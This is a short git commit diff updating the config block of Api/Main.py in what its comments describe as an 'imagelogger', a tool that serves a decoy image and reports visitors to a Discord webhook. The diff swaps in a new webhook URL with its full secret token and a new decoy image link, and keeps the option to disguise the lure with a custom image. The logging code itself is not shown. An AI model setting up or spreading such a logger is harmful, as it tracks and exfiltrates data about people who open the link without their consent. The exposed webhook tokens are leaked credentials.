d1b49bfd89b201cfe00b8c9dda8298eee01a6b81
vip2024vpn-hash <vip2024vpn@gmail.com>
2026-03-25 13:43:10 +0700

    Update Main.py

--- Api/Main.py
+++ Api/Main.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1486063589180837968/nPP2SxYTstO0yZ_F4Sziskh8-InjPSj5Lp2tnVn0B3Nk7d382ybgF-OSN2ijRj2lWQbi",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1486253109687619636/AtYj8MhbM-YNBZaqBVvZ_83ubzIfN4TWMHhlzJ9Cc3kwDv0BqHi0zz-z-bQFYNqN-Pit",
+    "image": "https://img.icons8.com/?size=100&id=59954&format=png&color=000000", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
